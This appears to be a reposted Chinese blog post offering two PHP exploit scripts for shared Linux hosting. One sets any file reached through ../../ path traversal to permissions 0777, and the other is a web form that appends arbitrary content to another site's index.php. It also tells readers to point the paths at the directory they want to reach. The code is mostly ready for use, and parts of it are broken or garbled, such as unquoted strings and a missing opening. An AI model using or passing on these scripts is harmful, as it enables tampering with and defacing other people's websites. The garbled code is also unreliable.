linux不提权跨目录访问的代码
stripslashes($_GET['path']);
$ok = chmod ($path , 0777);
if ($ok == true)
echo CHMOD OK , Permission editable file or directory. Permission to write;
?>

把上面代码保存为exp.php

然后访问http://www.luoyes.com/exp?path=../../要跨的目录/index.php

这里的index.PHP是要修改权限的文件。

收集的另一个exp：

把下面的代码保存为exp.PHP

代码：


<?php
@$filename = stripslashes($_POST['filename']);
@$mess = stripslashes($_POST['mess']);
$fp = @fopen({$_POST['filename']}, 'a');
@fputs($fp,$mess <hr size=1 color=black>);
@fclose($fp);
?>
<form name=form1 action=exploit.php method=post>
<p align=center><b>
<br>
CODE :<br>
<textarea name=mess rows=3></textarea></font></b></textarea>
</font></b> <p><input type=hidden name=filename value=../../AUTRE WEBSITE SUR LE MULTIHOSTING/index.php></p>
<center>
<input type=reset name=Submit value=Delete>
<input name=go type=submit value=Send onClick=javascript:this.style.visibility ='hidden';>
<center>
</form>
<meta http-equiv=Content-Type content=text/html; charset=iso-8859-1>
<title>Changing CHMOD Permissions Exploit – Contact : the_gl4di4t0r[AT]hotmail[DOT]com</title>
</head>
<body>
</center>
</body>


注意上面代码里面的路径。用的时候要改成你要访问的目录和文件。


本文来源于：半坑土农民'S Blog http://www.tmdsb.com 
